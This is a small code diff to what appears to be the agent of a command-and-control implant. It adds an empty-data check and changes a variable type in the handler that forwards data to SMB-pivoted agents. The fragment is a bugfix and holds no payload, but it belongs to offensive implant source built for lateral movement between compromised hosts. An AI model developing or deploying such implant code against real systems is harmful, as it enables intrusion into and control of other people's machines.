@@ -2434,10 +2434,16 @@ VOID CommandPivot( PPARSER Parser )
             PUTS( "DEMON_PIVOT_SMB_COMMAND" )
 
             UINT32      DemonId   = ParserGetInt32( Parser );
-            DWORD       Size      = 0;
+            INT         Size      = 0;
             PVOID       Data      = ParserGetBytes( Parser, &Size );
             PPIVOT_DATA TempList  = Instance.SmbPivots;
             PPIVOT_DATA PivotData = NULL;
+
+            if ( ! Data || ! Size )
+            {
+                PUTS( "Can't send empty data to pivot" )
+                return;
+            }
 
             PRINTF( "Search DemonId => %x\n", DemonId );
             do
